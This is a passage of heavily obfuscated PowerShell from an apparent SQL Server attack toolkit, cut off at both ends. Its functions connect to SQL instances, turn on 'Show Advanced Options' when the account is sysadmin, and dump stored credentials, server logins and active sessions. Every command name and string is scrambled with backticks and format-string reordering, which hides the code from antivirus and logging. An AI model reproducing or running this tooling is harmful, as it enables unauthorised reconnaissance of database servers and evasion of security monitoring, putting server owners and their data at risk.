                ${COn`NEcti`oN} = &("{1}{3}{2}{5}{0}{4}"-f 'Ob','Get-','Connec','SQL','ject','tion') -Instance ${in`STA`NcE} -Username ${uSE`R`NAMe} -Password ${pasS`W`Ord} -Credential ${CReD`en`Tial} -DAC -TimeOut ${t`im`eoUT}
            }
            else
            {
                
                ${c`oN`NEc`TIoN} = &("{1}{0}{4}{2}{3}{5}"-f'et','G','LC','onnectionObjec','-SQ','t') -Instance ${In`stan`CE} -Username ${u`SERNa`Me} -Password ${Pa`SSWO`RD} -Credential ${CRed`e`NTiAl} -TimeOut ${tI`M`EOut}
            }

            
            try
            {
                
                ${CO`N`NEC`TIoN}.("{0}{1}" -f'O','pen').Invoke()

                if(-not ${S`U`pPR`EssVerb`oSe})
                {
                    &("{1}{0}{2}" -f't','Wri','e-Verbose') -Message ("$Instance "+': '+'Connect'+'i'+'on '+'Su'+'ccess'+'.')
                }

                
                ${d`IsaBLEs`hoWADV`A`NceDO`Pti`oNS} = 0

                
                ${i`S`shOWaDvAn`ceD`ENab`LED} = &("{2}{1}{3}{0}" -f'Query','-','Get','SQL') -Instance ${INS`TA`NCe} -Query ((("{3}{2}{5}{6}{0}{7}{4}{9}{1}{8}"-f 'Ad','ons{','p_configure {','s','anc','0','}Show ','v','0}','ed Opti'))-f [CHAR]39) -Username ${u`sERnA`Me} -Password ${pasSW`Ord} -Credential ${C`ReD`ENTIaL} -SuppressVerbose | &("{1}{0}{3}{2}" -f 'Obj','Select-','t','ec') -Property ("{2}{0}{1}"-f'onfig_valu','e','c') -ExpandProperty ("{2}{1}{3}{0}" -f'e','onf','c','ig_valu')

                
                ${issY`Sad`mIN} = &("{4}{2}{3}{5}{1}{0}" -f 'eck','Ch','et','-SQLSysadm','G','in') -Instance ${INsT`AncE} -Credential ${c`Re`dE`NtiAl} -Username ${userN`Ame} -Password ${pAss`W`ord} -SuppressVerbose | &("{0}{3}{1}{2}{4}" -f'Se','ec','t-O','l','bject') -Property ("{0}{2}{1}"-f'Is','in','Sysadm') -ExpandProperty ("{2}{0}{1}" -f'd','min','IsSysa')

                
                if (${Issh`oW`ADVanCEdE`Nab`l`ED} -eq 1)
                {
                    if(-not ${sU`ppr`E`SsvERboSE})
                    {
                        &("{2}{3}{1}{0}" -f'-Verbose','e','W','rit') -Message ("$Instance "+': '+'Show'+' '+'Advan'+'c'+'ed '+'Opt'+'ion'+'s '+'is'+' '+'alread'+'y'+' '+'enabl'+'e'+'d.')
                    }
                }
                else
                {
                    if(-not ${suPpre`ssVe`Rbo`se})
                    {
                        &("{0}{2}{1}" -f 'Write','ose','-Verb') -Message ("$Instance "+': '+'S'+'how '+'Advan'+'c'+'ed '+'O'+'ptions '+'i'+'s '+'disabled'+'.')
                    }

                    if(${iS`sYSAdM`in} -eq 'Yes')
                    {
                        if(-not ${supP`Re`ss`V`erBoSE})
                        {
                            &("{3}{1}{0}{2}"-f'-Verb','rite','ose','W') -Message ("$Instance "+': '+'You'+'r '+'a '+'sysa'+'dmi'+'n, '+'tryi'+'n'+'g '+'to'+' '+'e'+'nabl'+'ed '+'i'+'t.')
                        }

                        
                        &("{3}{2}{1}{0}" -f 'uery','QLQ','-S','Get') -Instance ${INST`AN`Ce} -Query ((("{3}{0}{2}{7}{6}{8}{4}{5}{1}" -f'_c','ECONFIGURE','onfigur','sp','{0},1;','R','Show Advanced ','e {0}','Options')) -f  [ChAr]39) -Username ${U`S`erNAmE} -Password ${p`A`ssWoRd} -Credential ${CRE`d`e`NTiAL} -SuppressVerbose

                        
                        ${i`SShoWadv`A`NceD`EN`A`BlED2} = &("{3}{1}{2}{0}"-f'uery','et-S','QLQ','G') -Instance ${INst`A`N`CE} -Query ((("{1}{0}{10}{3}{6}{2}{9}{4}{7}{8}{5}"-f'_con','sp','van','8S','d','onsM28','how Ad',' Opt','i','ce','figure M2'))."re`PlAce"('M28',[String][char]39)) -Username ${U`seRNa`Me} -Password ${PA`ssWORD} -Credential ${cR`e`deNTiAl} -SuppressVerbose | &("{3}{1}{2}{0}"-f 'ect','ect-','Obj','Sel') -Property ("{2}{0}{1}"-f 'fig_v','alue','con') -ExpandProperty ("{3}{0}{2}{1}"-f 'n','lue','fig_va','co')

                        if (${i`sshoWa`DVANc`e`deNaBlEd2} -eq 1)
                        {
                            ${DISA`BLe`Sho`WaDvance`d`OPtiOns} = 1
                            if(-not ${sU`p`Pre`sSVE`RBose})
                            {
                                &("{0}{2}{1}"-f 'Writ','bose','e-Ver') -Message ("$Instance "+': '+'Enable'+'d '+'Sh'+'ow '+'Ad'+'vanc'+'ed '+'Option'+'s.')
                            }
                        }
                        else
                        {
                            if(-not ${suppRE`sS`Ve`R`BoSE})
                            {
                                &("{0}{1}{2}{3}"-f 'Wri','te-V','erbos','e') -Message ("$Instance "+': '+'Enab'+'ling'+' '+'S'+'how '+'A'+'dvance'+'d '+'O'+'pti'+'ons '+'f'+'ailed. '+'A'+'bort'+'ing.')
                            }
                        }
                    }
                }

                
                &("{1}{2}{0}{3}"-f'-SQLQuer','G','et','y') -Instance ${iN`S`TA`Nce} -Query ("{2}{1}{0}" -f 'e','nfigur','sp_co') -Username ${Use`RnamE} -Password ${pasS`w`orD} -Credential ${cRE`D`ENTial} -SuppressVerbose |
                &("{0}{2}{1}" -f 'ForEach','ject','-Ob') -Process {
                    ${S`e`TTin`gnAme} = ${_}."N`AME"
                    ${sETTing`m`in} = ${_}."m`ini`mUm"
                    ${s`eTtiN`GMax} = ${_}."M`Axim`Um"
                    ${S`EtTiNg`cO`Nf`_vA`Lue} = ${_}."cOnfIG`_VA`L`Ue"
                    ${SETt`iNGr`UN_V`Alue} = ${_}."rU`N_v`ALUE"

                    ${n`ULL} = ${t`B`lresul`Ts}."ro`ws".("{0}{1}" -f'Ad','d').Invoke(${cOMp`UT`eRNa`ME}, ${iN`Stan`ce}, ${Set`Tin`gna`Me}, ${s`ETT`InGm`IN}, ${S`ETTIN`Gmax}, ${seTting`coNF_`VAl`Ue}, ${settiNgRun`_`V`Alue})
                }

                
                if(${d`iSaBLEsH`owAdvA`NCEdO`PTIONS} -eq 1 -and ${ISSYsAd`m`IN} -eq 'Yes')
                {
                    if(-not ${sU`pp`RE`ssVErBose})
                    {
                        &("{1}{2}{0}" -f 'erbose','Write','-V') -Message ("$Instance "+': '+'Di'+'sa'+'bling '+'Show'+' '+'Adv'+'anced'+' '+'Opti'+'o'+'ns')
                    }
                    ${c`o`NFIgURAT`iOns} = &("{1}{2}{0}" -f 'SQLQuery','Get','-') -Instance ${InST`ANCe} -Query ((("{6}{4}{3}{5}{8}{7}{1}{2}{0}{9}" -f ';RECONFIGUR','tionsBO','E,0','w',' BOESho',' Advanc','sp_configure','d Op','e','E'))."rEp`LACE"('BOE',[StrInG][chAr]39)) -Username ${US`erNA`Me} -Password ${pa`ss`wORD} -Credential ${crE`DEntI`Al} -SuppressVerbose
                }

                
                ${C`ONnE`c`TIOn}.("{1}{0}"-f 'ose','Cl').Invoke()

                
                ${c`onN`E`ctiOn}.("{0}{1}"-f'Dispo','se').Invoke()
            }
            catch
            {
                
                if(-not ${SUpP`RE`ssVe`RBOSE})
                {
                    ${ERRO`RmesS`AgE} = ${_}."ExC`E`ptIoN"."mESS`A`gE"
                    &("{2}{1}{3}{0}" -f 'e','Verbo','Write-','s') -Message ("$Instance "+': '+'C'+'onnection'+' '+'F'+'ail'+'ed.')
                    
                }
            }
        }

        
        ${PipEL`InE`IT`EMs} | &("{2}{1}{0}" -f 'llel','a','Invoke-Par') -ScriptBlock ${MYs`cRiPT`B`Lock} -ImportSessionFunctions -ImportVariables -Throttle ${tHr`e`AdS} -RunspaceTimeout 2 -Quiet -ErrorAction ("{3}{0}{4}{1}{2}" -f 'tlyCont','nu','e','Silen','i')

        return ${tBl`ReS`Ul`Ts}
    }
}






Function  gEt-`sQlSeRvErcRE`dEn`T`IAl
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANDATOrY = ${FA`lsE},
        HeLPmEsSage = {"{6}{10}{7}{5}{3}{4}{0}{12}{11}{2}{8}{1}{9}"-f 'n','e','uthen','ver or ','domain accou','er','SQ',' S','ticat',' with.','L',' a','t to'})]
        [string]${uSE`RN`Ame},

        [Parameter(MANDaTORY = ${F`A`lse},
        hELPmesSagE = {"{8}{7}{0}{3}{4}{2}{5}{6}{1}{9}"-f'e','henti',' accou','r or',' domain','nt passw','ord to aut','Serv','SQL ','cate with.'})]
        [string]${pAs`s`wOrD},

        [Parameter(ManDATOry = ${FA`lSE},
        HeLpmESsaGE = {"{3}{4}{1}{2}{0}"-f 'tials.','ede','n','Windows',' cr'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`RE`DENt`ial} =  (  DIR VARIAbLe:0459M2 ).VAlue::"E`MpTy",

        [Parameter(mANDAtORy = ${F`AL`SE},
                vaLuEfrompIPEliNEbyPrOPERtyNamE = ${t`Rue},
        helPMEsSaGe = {"{11}{8}{6}{7}{4}{2}{1}{3}{10}{0}{9}{5}"-f'n','con','nce to ','nec','nsta','o.','erv','er i','L S',' t','tio','SQ'})]
        [string]${iN`s`T`Ance},

        [Parameter(maNdaToRY = ${F`AlSE},
                ValUefRoMPipELIne = ${t`RuE},
                VaLuefrOmpIpelINEbyPROpERTynaME = ${tR`UE},
        hElPMessaGe = {"{0}{2}{1}{3}"-f'Cred','al name','enti','.'})]
        [string]${CReDeNTia`ln`Ame},

        [Parameter(manDATorY = ${fa`LSe},
        HelpmEssaGe = {"{6}{2}{5}{1}{8}{3}{9}{4}{0}{7}{10}"-f'p','s','rbose err',' when f','on is wrap','or','Suppress ve','ed','.  Used','uncti','.'})]
        [switch]${sUpPR`eS`SV`ER`Bo`se}
    )

    Begin
    {
        ${TBLcRede`NtIa`lS} = &("{2}{1}{0}{3}"-f'j','Ob','New-','ect') -TypeName ("{5}{0}{1}{4}{2}{3}"-f'a.Dat','aTa','l','e','b','System.Dat')

        
        if(${cRed`EnT`IAl`N`AMe})
        {
            ${C`ReD`EnTIaL`NameF`ilTER} = (' '+'W'+'HERE '+'nam'+'e '+'l'+'ike '+"'$CredentialName'")
        }
        else
        {
            ${C`REDeNTiALN`AMEF`Il`TEr} = ''
        }
    }

    Process
    {
        
        ${comP`UT`ERNaME} = &("{3}{2}{0}{6}{5}{1}{4}" -f'am','sta','ComputerN','Get-','nce','n','eFromI') -Instance ${INS`T`AncE}

        
        if(-not ${INSTa`NCE})
        {
            ${IN`STa`Nce} = ${env:`C`oMpuT`ERName}
        }

        
        ${TEsTC`ONnECt`ioN} = &("{5}{0}{1}{4}{2}{3}"-f'SQLConnec','t','es','t','ionT','Get-') -Instance ${iNst`A`N`cE} -Username ${uSE`Rn`Ame} -Password ${pasSw`ORD} -Credential ${cR`eD`ENTIAL} -SuppressVerbose | &("{3}{2}{0}{1}"-f 'e-Ob','ject','er','Wh') -FilterScript {
            ${_}."STa`T`Us" -eq ("{0}{2}{1}"-f'Acce','e','ssibl')
        }
        if(${T`eStconNE`C`Ti`on})
        {
            if( -not ${sUpP`RE`s`SVeR`BO`se})
            {
                &("{2}{0}{1}{3}" -f'e-Ver','bo','Writ','se') -Message ("$Instance "+': '+'Conne'+'cti'+'on '+'Su'+'ccess.')
            }
        }
        else
        {
            if( -not ${SupPrEs`Sve`R`Bo`sE})
            {
                &("{0}{3}{2}{1}"-f 'Writ','bose','er','e-V') -Message ("$Instance "+': '+'Co'+'n'+'nect'+'ion '+'F'+'aile'+'d.')
            }
            return
        }

        
        ${quE`RY} = (' '+' '+'U'+'SE '+'m'+'ast'+'er;
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ELECT'+' '+' '+"'$ComputerName' "+'as'+' '+'[Compu'+'terNa'+'m'+'e],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Inst'+'ance],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'cr'+'ed'+'e'+'nt'+'ial_i'+'d,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'n'+'ame '+'as'+' '+'[Crede'+'n'+'ti'+'alNa'+'m'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'cr'+'ed'+'entia'+'l_identity,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'crea'+'te_'+'d'+'ate'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'modify_d'+'a'+'te,'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t'+'arge'+'t_type,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'target'+'_i'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+'['+'maste'+'r].[sy'+'s'+'].[c'+'rede'+'ntials]
 '+' '+' '+' '+' '+' '+' '+' '+"$CredentialNameFilter")

        
        ${tBLREs`U`LTS} = &("{1}{2}{3}{0}"-f 'ery','G','et','-SQLQu') -Instance ${InS`Ta`NCe} -Query ${QUE`Ry} -Username ${u`S`eRNAME} -Password ${p`ASsw`orD} -Credential ${C`ReDEnt`IAL} -SuppressVerbose

        
        ${t`BL`CR`EdeNtI`Als} = ${tbl`cred`e`NtIA`Ls} + ${T`BLRESuL`TS}
    }

    End
    {
        
        ${Tb`LCreDE`Nt`Ials}
    }
}





Function  G`eT-`SqlSErVeR`LOgIn
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANdATORY = ${fAl`se},
                ValuefRompipeLINeBypropertynAME = ${TR`Ue},
        helPMESsaGe = {"{0}{2}{6}{8}{4}{3}{1}{7}{5}"-f 'SQ','o a','L Ser','ount t',' acc','th.','ver or','uthenticate wi',' domain'})]
        [string]${u`seRName},

        [Parameter(mAndAToRY = ${fa`l`se},
                vAlUEfRompiPeLinEByPRoPERTynAMe = ${Tr`UE},
        helPmESsAgE = {"{4}{5}{8}{0}{7}{1}{3}{2}{9}{6}" -f ' or','omain account passwor',' authent','d to','S','QL Ser',' with.',' d','ver','icate'})]
        [string]${pAsS`wO`Rd},

        [Parameter(mAndaToRY = ${f`A`lsE},
        HELpmeSSAGE = {"{2}{3}{1}{4}{0}" -f '.','r','Wind','ows c','edentials'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`ReDEnT`ial} =   $0459M2::"em`PtY",

        [Parameter(mAnDAtorY = ${Fal`sE},
                VALuEFrOmpIPEliNebYproPeRtYNaME = ${T`RUE},
        HElpmesSAGE = {"{8}{10}{0}{9}{4}{2}{5}{3}{6}{1}{7}"-f 'instance ',' to','co','o',' ','nnecti','n','.','SQL','to',' Server '})]
        [string]${IN`stA`NCe},

        [Parameter(MAnDatORy = ${f`ALSe},
                vALuefroMpIpelINE = ${Tr`UE},
                VAlUEfrOMpipELiNeBYPRoPertYNAMe = ${t`RUe},
        HELpmESSage = {"{8}{3}{0}{7}{2}{1}{5}{6}{4}"-f'n',' fil','me to',' ','.','ter f','or','a','Principal'})]
        [string]${PR`INc`IPAL`NAmE},

        [Parameter(manDATORY = ${FA`lsE},
        HElpmesSaGE = {"{10}{0}{3}{6}{2}{13}{11}{9}{4}{8}{5}{12}{1}{7}"-f's ver','a','rors.  ','b','n ','s','ose er','pped.','function i','e','Suppres','sed wh',' wr','U'})]
        [switch]${su`Ppr`ES`SVErb`OSE}
    )

    Begin
    {
        
        ${TblLo`Gi`Ns} = &("{2}{1}{3}{0}" -f 'ect','ew-','N','Obj') -TypeName ("{0}{4}{2}{3}{1}" -f 'System.Da','e','.DataTa','bl','ta')
        ${N`ULl} = ${TbL`L`og`ins}."COl`UMnS".("{1}{0}"-f'd','Ad').Invoke(("{3}{1}{2}{0}"-f 'me','mputerN','a','Co'))
        ${N`UlL} = ${t`Bll`OgINS}."COL`UM`Ns".("{0}{1}" -f'A','dd').Invoke(("{2}{1}{0}" -f 'nce','sta','In'))
        ${nu`Ll} = ${tBLL`OG`inS}."Co`l`Umns".("{1}{0}" -f'd','Ad').Invoke(("{0}{3}{1}{2}"-f 'Pr','cipalI','d','in'))
        ${N`ULL} = ${T`BL`loG`ins}."cOLUm`NS".("{0}{1}"-f'A','dd').Invoke(("{2}{0}{3}{1}"-f'incipal','e','Pr','Nam'))
        ${NU`ll} = ${tBll`OgI`Ns}."coLu`mns".("{0}{1}"-f 'A','dd').Invoke(("{3}{0}{2}{1}"-f 'rincipa','id','lS','P'))
        ${Nu`ll} = ${T`Bl`Logi`Ns}."coL`UmNS".("{1}{0}"-f'd','Ad').Invoke(("{1}{3}{0}{4}{2}"-f'inc','P','pe','r','ipalTy'))
        ${nU`lL} = ${tBLLog`i`Ns}."col`UMNS".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{0}"-f'ate','eateD','Cr'))
        ${nU`LL} = ${tBL`L`oGINs}."c`oLum`NS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}" -f 'ocked','IsL'))

        
        if(${P`RiNciP`Alna`Me})
        {
            ${pRin`c`iP`ALN`A`MEFiltEr} = (' '+'an'+'d '+'n'+'ame '+'li'+'ke '+"'$PrincipalName'")
        }
        else
        {
            ${P`RIN`C`Ipa`L`N`AMEfILTer} = ''
        }
    }

    Process
    {
        

        
        ${com`PUTERn`AMe} = &("{7}{8}{0}{4}{3}{6}{5}{1}{2}"-f 'mp','mInst','ance','terNa','u','o','meFr','Get','-Co') -Instance ${iN`StA`NCe}

        
        if(-not ${i`N`st`ANCE})
        {
            ${In`sTa`NCE} = ${ENV:Co`m`pu`TE`RNAME}
        }

        
        ${T`est`Conn`eC`TIoN} = &("{0}{2}{4}{3}{1}"-f'Get-S','onTest','QLConne','i','ct') -Instance ${I`N`sTaNCe} -Username ${uS`eRnA`ME} -Password ${pasSw`O`RD} -Credential ${cR`eDeN`T`IAl} -SuppressVerbose | &("{0}{1}{2}" -f'Whe','re-Objec','t') -FilterScript {
            ${_}."S`Ta`TuS" -eq ("{1}{2}{0}"-f 'le','Ac','cessib')
        }
        if(${TES`TC`onNeC`Tion})
        {
            if( -not ${Sup`pREs`s`VErBOSE})
            {
                &("{1}{2}{3}{0}" -f'bose','Wr','ite','-Ver') -Message ("$Instance "+': '+'Connecti'+'on'+' '+'Suc'+'ces'+'s.')
            }
        }
        else
        {
            if( -not ${sUppr`e`Ss`Ver`BOSE})
            {
                &("{0}{2}{1}"-f'Write-','e','Verbos') -Message ("$Instance "+': '+'Conn'+'ection'+' '+'Fa'+'iled.')
            }
            return
        }

        
        ${qu`ERy} = (' '+' '+'US'+'E '+'m'+'aster'+';
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SEL'+'ECT '+' '+"'$ComputerName' "+'a'+'s '+'['+'C'+'ompute'+'rN'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'['+'Ins'+'tance],princ'+'i'+'pal_id'+' '+'as'+' '+'['+'Princip'+'al'+'Id'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'na'+'me '+'a'+'s '+'[P'+'rincip'+'al'+'Name],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'si'+'d '+'as'+' '+'[Pr'+'incipalS'+'id'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t'+'ype_des'+'c '+'a'+'s '+'[Pri'+'ncipalTyp'+'e],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'create_'+'da'+'te '+'as'+' '+'['+'Crea'+'teDate'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'L'+'OGINPROP'+'ERT'+'Y '+'( '+'n'+'ame '+', '+('{0'+'}Is'+'Locked{'+'0'+'} ')-F [cHar]39+') '+'as'+' '+'['+'IsLocked]
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'[sy'+'s].[ser'+'ve'+'r_'+'p'+'rinci'+'pal'+'s]'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WH'+'E'+'RE '+'ty'+'pe '+'= '+(('DOk'+'SDOk'+' ') -crePLACe  'DOk',[cHar]39)+'o'+'r '+'typ'+'e '+'= '+(('tQ'+'LUt'+'QL ')  -crEpLaCE ([Char]116+[Char]81+[Char]76),[Char]39)+'o'+'r '+'typ'+'e '+'= '+(('NfBCN'+'f'+'B
 ')-CREPlacE 'NfB',[CHaR]39)+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter")

        
        ${T`BLRESUL`Ts} = &("{1}{0}{2}" -f'QL','Get-S','Query') -Instance ${INsT`An`CE} -Query ${QuE`Ry} -Username ${U`S`e`RNaME} -Password ${PASSw`O`Rd} -Credential ${cR`EDE`N`TIAl} -SuppressVerbose

        
        ${Tblr`eSu`LtS} |
        &("{0}{4}{1}{3}{2}"-f 'Fo','h','ct','-Obje','rEac') -Process {
            
            ${NE`wSId} =   (vAriaBLE  ('lc'+'s2')  ).vAluE::("{2}{0}{1}"-f 'oSt','ring','T').Invoke(${_}."p`RiNCIP`AlSid").("{1}{2}{0}"-f 'ce','Rep','la').Invoke('-','')
            if (${N`E`wsID}."l`engTh" -le 10)
            {
                ${S`iD} =   $qmrk::("{0}{1}" -f 'ToI','nt32').Invoke(${n`eWsid},16)
            }
            else
            {
                ${S`iD} = ${Ne`w`sId}
            }

            
            ${N`UlL} = ${T`BllOgI`NS}."RO`Ws"."A`dD"(
                [string]${_}."co`MPU`Ter`NaME",
                [string]${_}."iNS`T`Ance",
                [string]${_}."P`RI`NCipalid",
                [string]${_}."priNci`PAl`NaME",
                ${S`ID},
                [string]${_}."pri`NcIP`AltYpe",
                ${_}."CReaT`ED`ATE",
            [string]${_}."ISL`OCk`Ed")
        }
    }

    End
    {
        
        ${t`BLLogi`Ns}
    }
}








Function  GE`T-sQl`sE`SS`IoN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDATORY = ${F`Alse},
                VaLuEFrOmpIpElINEBYpROPertyname = ${T`RUE},
        hElPmESSAGE = {"{8}{2}{4}{1}{3}{5}{0}{6}{7}{10}{9}{11}"-f' t',' d','erv','oma','er or','in account','o aut','h','SQL S','h','enticate wit','.'})]
        [string]${userNA`ME},

        [Parameter(mANDAtORy = ${Fal`SE},
                valuEFrompipeLInebyPrOPErtYName = ${T`Rue},
        HElPmESsAgE = {"{11}{7}{3}{0}{2}{5}{8}{10}{1}{9}{6}{4}"-f'acc','a','ount p','ain ','h.','a','enticate wit','er or dom','ssword ','uth','to ','SQL Serv'})]
        [string]${pa`SSwo`Rd},

        [Parameter(MaNdATOry = ${Fa`l`SE},
        HeLpMessage = {"{0}{5}{1}{4}{6}{2}{3}"-f'Wi','ows ','ial','s.','cr','nd','edent'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`Re`DeNti`Al} =   (  GeT-vaRiAble ("0459m"+"2")  -VAlUeONl)::"e`mPTY",

        [Parameter(ManDATORy = ${Fa`L`sE},
                valuefRompIpElInEbyproPERtynAme = ${tR`UE},
        HelPMessAge = {"{4}{3}{1}{5}{6}{0}{2}{9}{7}{8}"-f'to',' instanc',' ','rver','SQL Se','e',' ','tion t','o.','connec'})]
        [string]${IN`S`Ta`Nce},

        [Parameter(mAnDatoRy = ${FAL`sE},
                ValuEFRoMPiPELInE = ${T`Rue},
                VALUefRoMpipeLINEbYpROperTyNAme = ${tR`UE},
        HElpmeSSage = {"{3}{1}{0}{2}"-f 'nci','ri','palName.','P'})]
        [string]${P`RinC`ipALN`AME},

        [Parameter(ManDAtorY = ${F`Alse},
        hElPmeSsAGE = {"{5}{9}{6}{0}{4}{10}{7}{2}{1}{8}{3}"-f 'errors.  Use','un','n f','s wrapped.','d ','Suppress','ose ','e','ction i',' verb','wh'})]
        [switch]${SuPP`RESsv`ErBosE}
    )

    Begin
    {
        
        ${t`BLsESS`IoNs} = &("{1}{3}{0}{2}"-f 'j','N','ect','ew-Ob') -TypeName ("{1}{3}{4}{2}{0}" -f'e','S','aTabl','ystem.Data.Da','t')
        ${N`ULL} = ${tB`l`SEsSIOns}."CoL`UMNS".("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}" -f'ame','terN','Compu'))
        ${n`UlL} = ${Tb`L`Se`ssionS}."CO`l`UmNs".("{0}{1}"-f'A','dd').Invoke(("{2}{0}{1}"-f 'stanc','e','In'))
        ${nU`Ll} = ${tBls`E`ssIo`Ns}."CoL`UMns".("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}{3}" -f'alSi','incip','Pr','d'))
        ${nU`lL} = ${TbLS`E`sSI`ONs}."CoL`U`mnS".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f'Princip','alNa','me'))
        ${n`UlL} = ${TBLSEsS`IO`Ns}."C`Ol`UMnS".("{1}{0}"-f 'dd','A').Invoke(("{1}{4}{5}{3}{2}{0}" -f 'e','Ori','alNam','ip','ginalPrin','c'))
        ${n`Ull} = ${TbLsE`SSi`O`NS}."C`OL`UmNS".("{0}{1}" -f'A','dd').Invoke(("{2}{0}{1}"-f'ssionI','d','Se'))
        ${nu`ll} = ${Tb`lsESsI`onS}."cOlUm`NS".("{1}{0}"-f 'dd','A').Invoke(("{3}{4}{0}{2}{1}" -f 'a','Time','rt','Ses','sionSt'))
        ${NU`Ll} = ${tBLSE`sS`i`Ons}."c`oLumns".("{0}{1}"-f 'Ad','d').Invoke(("{2}{3}{1}{0}{4}" -f'nTi','i','SessionL','og','me'))
        ${n`ULl} = ${t`BlSEs`sIonS}."co`lum`NS".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}"-f 'tus','a','SessionSt'))

        
        if(${pR`I`NcIpAl`NaMe})
        {
            ${prINc`I`pAL`Na`mEFil`T`ER} = (' '+'an'+'d '+'logi'+'n_n'+'ame '+'like'+' '+"'$PrincipalName'")
        }
        else
        {
            ${PrInciPaL`NAmef`il`TER} = ''
        }
    }

    Process
    {
        

        
        ${co`mpUT`E`R`NaME} = &("{3}{1}{0}{2}{7}{5}{6}{4}" -f 'om','t-C','p','Ge','omInstance','erNa','meFr','ut') -Instance ${i`NS`TaNce}

        
        if(-not ${I`NSTan`ce})
        {
            ${InsTA`Nce} = ${E`Nv`:`cOMPuter`Na`Me}
        }

        
        ${TE`stcO`NNectIon} = &("{0}{3}{1}{4}{2}" -f'Get-SQ','onnecti','nTest','LC','o') -Instance ${I`N`sTAncE} -Username ${U`Serna`ME} -Password ${PaS`sw`ORD} -Credential ${C`R`EdeNTi`AL} -SuppressVerbose | &("{1}{0}{2}"-f'ere-O','Wh','bject') -FilterScript {
            ${_}."s`TatUs" -eq ("{3}{2}{1}{0}" -f'le','ssib','ce','Ac')
        }
        if(${tE`StcONn`ect`IoN})
        {
            if( -not ${SUpP`REs`s`V`erbOse})
            {
                &("{3}{2}{1}{0}"-f 'rbose','-Ve','rite','W') -Message ("$Instance "+': '+'C'+'onnec'+'tion'+' '+'Succ'+'e'+'ss.')
            }
        }
        else
        {
            if( -not ${sup`p`Re`s`SVerBoSe})
            {
                &("{3}{2}{0}{1}" -f'o','se','te-Verb','Wri') -Message ("$Instance "+': '+'Conn'+'ec'+'tion'+' '+'Fai'+'led.')
            }
            return
        }

        
        ${qu`e`Ry} = (' '+' '+'USE'+' '+'ma'+'ste'+'r;
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'LE'+'CT '+' '+"'$ComputerName' "+'as'+' '+'[Comp'+'ute'+'rNa'+'me'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[In'+'st'+'ance'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'sec'+'uri'+'ty_'+'id '+'as'+' '+'[P'+'r'+'i'+'n'+'cipalSid'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'l'+'ogin_na'+'m'+'e '+'a'+'s '+'[Pri'+'n'+'ci'+'palNa'+'me]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'origin'+'al'+'_'+'logi'+'n_name '+'as'+' '+'[Ori'+'gin'+'alP'+'rincipa'+'lNam'+'e],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ses'+'sion'+'_id '+'a'+'s '+'[Se'+'ssionId]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'last_request_'+'start'+'_'+'ti'+'me '+'a'+'s '+'[SessionS'+'tartT'+'im'+'e],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'login'+'_ti'+'me '+'a'+'s '+'[S'+'es'+'sionLoginTi'+'me],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'st'+'atus '+'a'+'s '+'['+'Sess'+'i'+'onStatus]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+' '+' '+' '+'[sys'+'].[dm_'+'e'+'xec_session'+'s]
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'OR'+'DER '+'BY'+' '+'stat'+'u'+'s
 '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter")

        
        ${TBLRE`S`Ul`Ts} = &("{2}{3}{1}{0}"-f 'ry','ue','Get-SQ','LQ') -Instance ${i`Nsta`Nce} -Query ${Qu`ERY} -Username ${USE`R`Name} -Password ${pAS`S`worD} -Credential ${CRED`Ent`IaL} -SuppressVerbose

        
        ${T`BLReSU`Lts} |
